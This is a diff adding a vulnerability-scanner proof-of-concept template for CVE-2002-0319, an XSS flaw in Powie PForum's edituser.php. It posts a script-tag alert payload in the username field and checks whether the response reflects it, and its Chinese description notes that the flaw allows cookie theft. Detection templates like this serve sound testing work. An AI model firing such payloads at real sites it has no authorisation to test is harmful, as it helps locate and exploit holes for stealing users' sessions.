@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "Powie PForum 1.14及之前版本edituser.php存在跨站脚本漏洞，攻击者可通过用户名字段注入JavaScript代码窃取用户Cookie"
+id = "POC-AVE-2002-0260"
+name = "CVE-2002-0319 PoC"
+severity = "high"
+tags = ["ave-2002-0260"]
+vuln_id = [
+    "CVE-2002-0319",
+    "AVE-2002-0260",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/pforum/edituser.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=<script>alert('XSS')</script>&email=test@test.com&submit=Submit"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert('XSS')</script>"]
